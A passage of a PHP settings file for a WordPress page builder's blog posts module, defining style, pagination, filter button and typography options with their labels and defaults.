                'title' => __( 'Post Meta Sort Order', 'uabb' ),
                'fields' => array(
                    'meta_sort_order' => array(
                        'type' => 'uabb-sortable',
                        'label' => __('', 'uabb'),
                        'default' => 'author,date,taxonomy,comment',
                        'options' => array(
                            'author'    => __('Author', 'uabb'),
                            'date'      => __('Date', 'uabb'),
                            'taxonomy'  => __('Taxonomy', 'uabb'),
                            'comment'   => __('Comment', 'uabb'),
                        ),
                    )
                )
            ) 
        )
    ),
    'style'       => array( // Tab
        'title'         => __('Style', 'uabb'), // Tab title
        'sections'      => array( // Tab Sections
            'alignment' => array(
                'title' => __( '', 'uabb' ),
                'fields' => array(
                    'overall_alignment' => array(
                        'type'          => 'select',
                        'label' => __('Overall Alignment', 'uabb'),
                        'help'         => __('Controls the content alignment of each individual post.', 'uabb'),
                        'default'       => 'center',
                        'options'       => array(
                            'center' => __( 'Center', 'uabb' ),
                            'left' => __( 'Left', 'uabb' ),
                            'right' => __( 'Right', 'uabb' ),
                        ),
                    ),
                    'overall_padding' => array(
                        'type'      => 'uabb-spacing',
                        'label'     => __( 'Overall Padding', 'uabb' ),
                        'help'         => __('Manage the outside spacing of entire area of post.', 'uabb'),
                        'default'   => 'padding: 0px;',    //optional
                        'mode'      => 'padding',
                    ),
                    'element_space' => array(
                        'type' => 'text',
                        'label' => __('Space Between Posts', 'uabb'),
                        'size' => '8',
                        'placeholder' => '15',
                        'description' => 'px',
                        'help'         => __('Manage the spacing between two posts.', 'uabb'),
                    ),
                    'below_element_space' => array(
                        'type' => 'text',
                        'label' => __('Bottom Spacing', 'uabb'),
                        'size' => '8',
                        'placeholder' => '30',
                        'description' => 'px',
                    ),
                    'show_box_shadow'     => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Show Box Shadow', 'uabb' ),
                        'help'         => __('Enable this to display box shadow for each individual post.', 'uabb'),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                    'show_date_box'     => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Show Date Box', 'uabb' ),
                        'help'         => __('Enable this to display date box at top left corner of each individual post.', 'uabb'),
                        'default'       => 'no',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                        'toggle' => array(
                            'yes' => array(
                                'fields' => array( 'date_box_format' ),
                                'sections' => array( 'date_typography' )
                            )
                        )
                    ),
                    'date_box_format' => array(
                        'type'          => 'select',
                        'label'         => __('Date Format', 'uabb'),
                        'default'       => 'M j, Y',
                        'options'       => array(
                            'M j Y'        => date_i18n('M j Y'),
                            'F j Y'        => date_i18n('F j Y'),
                            'm d Y'         => date_i18n('m d Y'),
                            'd m Y'         => date_i18n('d m Y'),
                            'Y m d'         => date_i18n('Y m d'),
                        )
                    ),
                    'equal_height_box'     => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Equal Height Boxes', 'uabb' ),
                        'help'         => __('Enable this to display all posts with same height.', 'uabb'),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                )
            ),
            'style' => array(
                'title' => __( 'Content Area Styling', 'uabb' ),
                'fields' => array(
                    'content_padding' => array(
                        'type'      => 'uabb-spacing',
                        'label'     => __( 'Content Padding', 'uabb' ),
                        'help'         => __('Manage the outside spacing of content area of post.', 'uabb'),
                        'default'   => 'padding: 25px;',    //optional
                        'mode'      => 'padding',
                    ),
                    'content_background_color' => array( 
                        'type'       => 'color',
                        'label'         => __('Content Background Color', 'uabb'),
                        'default'       => 'f6f6f6',
                        'help'         => __('Controls the background color of content area (Area below the featured image).', 'uabb'),
                        'show_reset' => true,
                    ),
                    'content_background_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),

                )
            ),
            'pagination_setting' => array(
                'title' => __('Pagination', 'uabb'),
                'fields' => array(
                    'show_pagination' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Show Pagination', 'uabb' ),
                        'default'       => 'no',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                        'toggle'    => array(
                            'yes'   => array(
                                'fields' => array( 'pagination', 'posts_per_page' ),
                            )
                        )
                    ),
                    'pagination' => array(
                        'type'          => 'select',
                        'label'         => __('Pagination Style', 'uabb'),
                        'default'       => 'numbers',
                        'options'       => array(
                            'numbers'       => __('Numbers', 'uabb'),
                            /*'scroll'        => __('Scroll', 'uabb'),*/
                            /*'none'          => _x( 'None', 'Pagination style.', 'uabb' ),*/
                        )
                    ),
                    'posts_per_page' => array(
                        'type'          => 'text',
                        'label'         => __('Posts Per Page', 'uabb'),
                        'placeholder'       => '10',
                        'size'          => '8'
                    )
                )
            ),
            'pagination_style' => array(
                'title' => __('Pagination Style', 'uabb'),
                'fields' => array(
                    'pagination_alignment'       => array(
                        'type'          => 'select',
                        'label'         => __('Pagination Alignment', 'uabb'),
                        'default'       => 'center',
                        'options'       => array(
                            'left'             => __('Left', 'uabb'),
                            'right'             => __('Right', 'uabb'),
                            'center'      => __('Center', 'uabb'),
                        ),
                    ),
                    'pagination_style'       => array(
                        'type'          => 'select',
                        'label'         => __('Pagination Button Style', 'uabb'),
                        'default'       => 'circle',
                        'options'       => array(
                            'square'             => __('Flat', 'uabb'),
                            /*'circle'             => __('Circle Background', 'uabb'),*/
                            'square-border'      => __('Transparent', 'uabb'),
                            /*'circle-border'      => __('Circle Border', 'uabb')*/
                        ),
                        'toggle'        => array(
                            'square-border' => array(
                                'fields'        => array( 'pagination_color', 'pagination_color_border', 'pagination_active_color_border', 'pagination_active_color', 'pagination_border_size', 'pagination_border_style' )
                            ),
                            'square' => array(
                                'fields'        => array( 'pagination_color', 'pagination_hover_color', 'pagination_active_color', 'pagination_background_color', 'pagination_background_color_opc',
                                    'pagination_hover_background_color', 'pagination_hover_background_color_opc',
                                    'pagination_active_background_color', 'pagination_active_background_color_opc' )
                            ),
                        )
                    ),
                    'pagination_border_style'       => array(
                        'type'          => 'select',
                        'label'         => __('Border Style', 'uabb'),
                        'default'       => 'solid',
                        'help'          => __( 'The type of border to use. Double borders must have a height of at least 3px to render properly.', 'uabb' ),
                        'options'       => array(
                            'solid'     => __('Solid', 'uabb'),
                            'dotted'    => __('Dotted', 'uabb'),
                            'dashed'    => __('Dashed', 'uabb'),
                            'double'    => __('Double', 'uabb'),
                        ),
                    ),
                    'pagination_border_size'       => array(
                        'type'          => 'text',
                        'label'         => __('Border Size', 'uabb'),
                        'placeholder'   => '2',
                        'description'   => 'px',
                        'size'          => '8',
                        'max_lenght'    => '3'
                    ),
                    'pagination_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'pagination_hover_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Hover Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'pagination_active_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Active Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'pagination_background_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Background Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'pagination_background_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                    'pagination_hover_background_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Background Hover Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'pagination_hover_background_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                    'pagination_active_background_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Background Active Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'pagination_active_background_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                    'pagination_color_border' => array( 
                        'type'       => 'color',
                        'label'      => __('Border Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'pagination_active_color_border' => array( 
                        'type'       => 'color',
                        'label'      => __('Border Active Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                )
            ),
            'masonary_style' => array(
                'title' => __( 'Taxonomy Filter Button Styling', 'uabb' ),
                'fields' => array(
                    'masonary_overall_alignment' => array(
                        'type'          => 'select',
                        'label' => __('Button Alignment', 'uabb'),
                        'default'       => 'center',
                        'options'       => array(
                            'center' => __( 'Center', 'uabb' ),
                            'left' => __( 'Left', 'uabb' ),
                            'right' => __( 'Right', 'uabb' ),
                        ),
                        'help' => __( 'Controls the alignment of filter button\'s section.', 'uabb' )
                    ),
                    'masonary_bottom_spacing'  => array(
                        'type'          => 'text',
                        'label'         => __('Bottom Spacing', 'uabb'),
                        'description'   => __( 'px', 'uabb' ),
                        'placeholder'   => '40',
                        'size'          => '8',
                        'help'          => __('Use this setting to manage the space between filters and post.', 'uabb')
                    ),
                    'masonary_padding' => array(
                        'type'      => 'uabb-spacing',
                        'label'     => __( 'Button Padding', 'uabb' ),
                        'default'   => 'padding: 12px;',    //optional
                        'mode'      => 'padding',
                    ),
                    'masonary_button_style'       => array(
                        'type'          => 'select',
                        'label'         => __('Button Style', 'uabb'),
                        'default'       => 'circle',
                        'options'       => array(
                            'square'             => __('Flat', 'uabb'),
                            /*'circle'             => __('Circle Background', 'uabb'),*/
                            'square-border'      => __('Transparent', 'uabb'),
                            /*'circle-border'      => __('Circle Border', 'uabb')*/
                        ),
                        'toggle'        => array(
                            'square-border' => array(
                                'fields'        => array( 'masonary_text_color', 'masonary_color_border', 'masonary_active_color_border', 'masonary_active_color', 'masonary_border_size', 'masonary_border_style' )
                            ),
                            'square' => array(
                                'fields'        => array( 'masonary_text_color', 'masonary_text_hover_color', 'masonary_active_color', 'masonary_background_color', 'masonary_background_color_opc',
                                    'masonary_background_hover_color', 'masonary_background_hover_color_opc',
                                    'masonary_background_active_color', 'masonary_background_active_color_opc' )
                            ),
                        )
                    ),
                    'masonary_border_style'       => array(
                        'type'          => 'select',
                        'label'         => __('Border Style', 'uabb'),
                        'default'       => 'solid',
                        'help'          => __( 'The type of border to use. Double borders must have a height of at least 3px to render properly.', 'uabb' ),
                        'options'       => array(
                            'solid'     => __('Solid', 'uabb'),
                            'dotted'    => __('Dotted', 'uabb'),
                            'dashed'    => __('Dashed', 'uabb'),
                            'double'    => __('Double', 'uabb'),
                        ),
                    ),
                    'masonary_border_size'  => array(
                        'type'          => 'text',
                        'label'         => __('Border Size', 'uabb'),
                        'description'   => __( 'px', 'uabb' ),
                        'placeholder'   => '2',
                        'size'          => '8',
                    ),
                    'masonary_border_radius'  => array(
                        'type'          => 'text',
                        'label'         => __('Border Radius', 'uabb'),
                        'description'   => __( 'px', 'uabb' ),
                        'placeholder'   => '2',
                        'size'          => '8',
                    ),
                    'masonary_text_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Text Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'masonary_text_hover_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Hover Text Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'masonary_active_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Active Text Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'masonary_background_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Background Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'masonary_background_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                    'masonary_background_hover_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Hover Background Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'masonary_background_hover_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                    'masonary_background_active_color' => array( 
                        'type'       => 'color',
                        'label'      => __('Active Background Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'masonary_background_active_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                    'masonary_color_border' => array( 
                        'type'       => 'color',
                        'label'      => __('Border Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'masonary_active_color_border' => array( 
                        'type'       => 'color',
                        'label'      => __('Border Active Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                )
            ),
        ),
    ),
    'typography'       => array( // Tab
        'title'         => __('Typography', 'uabb'), // Tab title
        'sections'      => array( // Tab Sections
            'title_typography' => array(
                'title' => __('Title', 'uabb' ),
                'fields'    => array(
                    'title_tag_selection'   => array(
                        'type'          => 'select',
                        'label'         => __('Tag', 'uabb'),
                        'default'       => 'h3',
                        'options'       => array(
                            'h1'      => __('H1', 'uabb'),
                            'h2'      => __('H2', 'uabb'),
                            'h3'      => __('H3', 'uabb'),
                            'h4'      => __('H4', 'uabb'),
                            'h5'      => __('H5', 'uabb'),
                            'h6'      => __('H6', 'uabb'),
                            'div'     => __('Div', 'uabb'),
                            'p'       => __('p', 'uabb'),
                            'span'    => __('span', 'uabb'),
                        )
                    ),
                    'title_font_family'       => array(
                        'type'          => 'font',
                        'label'         => __('Font Family', 'uabb'),
                        'default'       => array(
                            'family'        => 'Default',
                            'weight'        => 'Default'
                        ),
                        'preview'         => array(
                            'type'            => 'font',
                            'selector'        => '.uabb-post-heading'
                        )
                    ),
                    'title_font_size'     => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Font Size', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                    'title_line_height'    => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Line Height', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                        'margin_top'       => array(
                            'type'          => 'text',
                            'label'         => __('Margin Top', 'uabb'),
                            'description'   => 'px',
                            'size'          => '8',
                            'max_length'    => '3'
                        ),
                        'margin_bottom'       => array(
                            'type'          => 'text',
                            'label'         => __('Margin Bottom', 'uabb'),
                            'description'   => 'px',
                            'size'          => '8',
                            'max_length'    => '3'
                        ),
                    ),
                    'title_color'        => array( 
                        'type'       => 'color',
                        'label'      => __('Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                )
            ),
            'desc_typography' => array(
                'title' => __('Description / Excerpt / Content', 'uabb' ),
                'fields'    => array(
                    'desc_font_family'       => array(
                        'type'          => 'font',
                        'label'         => __('Font Family', 'uabb'),
                        'default'       => array(
                            'family'        => 'Default',
                            'weight'        => 'Default'
                        ),
                        'preview'         => array(
                            'type'            => 'font',
                            'selector'        => '.uabb-blog-posts-description'
                        )
                    ),
                    'desc_font_size'     => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Font Size', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                    'desc_line_height'    => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Line Height', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                    'desc_color'        => array( 
                        'type'       => 'color',
                        'label'      => __('Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                )
            ),
            'meta_typography' => array(
                'title'     => __('Post Meta', 'uabb'),
                'fields'    => array(
                    'meta_tag_selection'   => array(
                        'type'          => 'select',
                        'label'         => __('Meta Tag', 'uabb'),
                        'default'       => 'h5',
                        'options'       => array(
                            'h1'      => __('H1', 'uabb'),
                            'h2'      => __('H2', 'uabb'),
                            'h3'      => __('H3', 'uabb'),
                            'h4'      => __('H4', 'uabb'),
                            'h5'      => __('H5', 'uabb'),
                            'h6'      => __('H6', 'uabb'),
                            'div'     => __('Div', 'uabb'),
                            'p'       => __('p', 'uabb'),
                            'span'    => __('span', 'uabb'),
                        )
                    ),
                    'meta_font_family'       => array(
                        'type'          => 'font',
                        'label'         => __('Font Family', 'uabb'),
                        'default'       => array(
                            'family'        => 'Default',
                            'weight'        => 'Default'
                        ),
                        'preview'         => array(
                            'type'            => 'font',
                            'selector'        => '.uabb-post-meta'
                        )
                    ),
                    'meta_font_size'     => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Font Size', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                    'meta_line_height'    => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Line Height', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                    'meta_text_color'        => array( 
                        'type'       => 'color',
                        'label'         => __('Meta Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'meta_color'        => array( 
                        'type'       => 'color',
                        'label'         => __('Meta Link Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'meta_hover_color' => array( 
                        'type'       => 'color',
                        'label'         => __('Meta Link Hover Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                )
            ),
            'date_typography'    =>  array(
                'title' => __( 'Date Box', 'uabb' ),
                'fields'    => array(
                    'date_tag_selection'   => array(
                        'type'          => 'select',
                        'label'         => __('Tag', 'uabb'),
                        'default'       => 'h2',
                        'options'       => array(
                            'h1'      => __('H1', 'uabb'),
                            'h2'      => __('H2', 'uabb'),
                            'h3'      => __('H3', 'uabb'),
                            'h4'      => __('H4', 'uabb'),
                            'h5'      => __('H5', 'uabb'),
                            'h6'      => __('H6', 'uabb'),
                            'div'     => __('Div', 'uabb'),
                            'p'       => __('p', 'uabb'),
                            'span'    => __('span', 'uabb'),
                        )
                    ),
                    'date_font_family'       => array(
                        'type'          => 'font',
                        'label'         => __('Font Family', 'uabb'),
                        'default'       => array(
                            'family'        => 'Default',
                            'weight'        => 'Default'
                        ),
                        'preview'   => array(
                            'type'      => 'font',
                            'selector'  => '.uabb-posted-on'
                        ),
                    ),
                    'date_font_size'     => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Font Size', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                    'date_color'        => array( 
                        'type'       => 'color',
                        'label'         => __('Date Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'date_background_color' => array( 
                        'type'       => 'color',
                        'label'         => __('Date Background Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'date_background_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                )
            ),
            'link_typography'    =>  array(
                'title' => __( 'Call to Action', 'uabb' ),
                'fields'    => array(
                    'link_font_family'       => array(
                        'type'          => 'font',
                        'label'         => __('Font Family', 'uabb'),
                        'default'       => array(
                            'family'        => 'Default',
                            'weight'        => 'Default'
                        ),
                        'preview'   => array(
                            'type'      => 'font',
                            'selector'  => '.uabb-read-more-text a'
                        ),
                    ),
                    'link_font_size'     => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Font Size', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                    'link_line_height'    => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Line Height', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                    'link_color'        => array( 
                        'type'       => 'color',
                        'label'         => __('Link Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'link_more_arrow_color' => array( 
                        'type'       => 'color',
                        'label'         => __('Arrow Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                )
            ),
            'btn_typography'    =>  array(
                'title' => __( 'CTA Button', 'uabb' ),
                'fields'    => array(
                    'btn_font_family'       => array(
                        'type'          => 'font',
                        'label'         => __('Font Family', 'uabb'),
                        'default'       => array(
                            'family'        => 'Default',
                            'weight'        => 'Default'
                        ),
                        'preview'   => array(
                            'type'      => 'font',
                            'selector'  => 'a.uabb-button'
                        ),
                    ),
                    'btn_font_size'     => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Font Size', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                    'btn_line_height'    => array(
                        'type'          => 'uabb-simplify',
                        'label'         => __( 'Line Height', 'uabb' ),
                        'default'       => array(
                            'desktop'       => '',
                            'medium'        => '',
                            'small'         => '',
                        ),
                    ),
                )
            ),
        )
    ),
));
